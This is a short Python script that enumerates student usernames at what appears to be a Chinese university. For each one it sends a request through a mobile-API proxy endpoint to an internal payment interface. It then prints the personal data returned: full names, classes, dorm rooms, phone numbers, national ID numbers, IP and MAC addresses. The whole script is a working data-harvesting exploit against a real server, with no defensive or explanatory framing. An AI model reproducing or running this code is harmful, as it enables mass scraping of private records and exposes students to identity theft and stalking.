#!/usr/bin/env python3
# -*- coding: utf-8 -*-

__author__ = 'MICROYU'

import json
import requests

grade = input('Please input grade (default 16):')
if (not grade):
    grade = 16
    
name = input('Please input username:')
print('Looking up all matches……')

for i in range(0,100):
    if i > 9:
        username = name + str(i) + str(grade)
    else:
        username = name + '0' + str(i) + str(grade)
    
    url = 'http://202.98.18.57:18080/webservice/m/api/proxy'
    data = 'link=http://ip.jlu.edu.cn/pay/interface_mobile.php&mail=' + username + '&menu=get_mail_info' 

    headers = {
                'Connection':'keep-alive',
                'Host':'202.98.18.57:18080',
                'Content-Type':'application/x-www-form-urlencoded',
            }

    req = requests.post(url, headers=headers, data=data)
    json_info = json.loads(req.text)

    if json_info['resultValue']['content'][8] == '0':
        pass
    else:
        info = json.loads(json_info['resultValue']['content'])
        print(username)
        if len(info['ip']):
            ip = info['ip'][0]
            ip_info = info['ip_info'][ip]
            print('Name:' + ip_info['fullname'], 'Class:' + ip_info['class'], \
            '\nCampus:' + ip_info['campus'], 'NetArea:' + ip_info['net_area'], 'Room:' + ip_info['home_addr'], \
            '\nTel:' + ip_info['phone'], 'ID:' + info['zhengjianhaoma'], \
            '\nIP:' + ip, 'MAC:'+ ip_info['mac'] + '\n')
        else:
            print('Name:' + info['name'], 'Class:' + info['class'], 'ID:' + info['zhengjianhaoma'] + '\n')
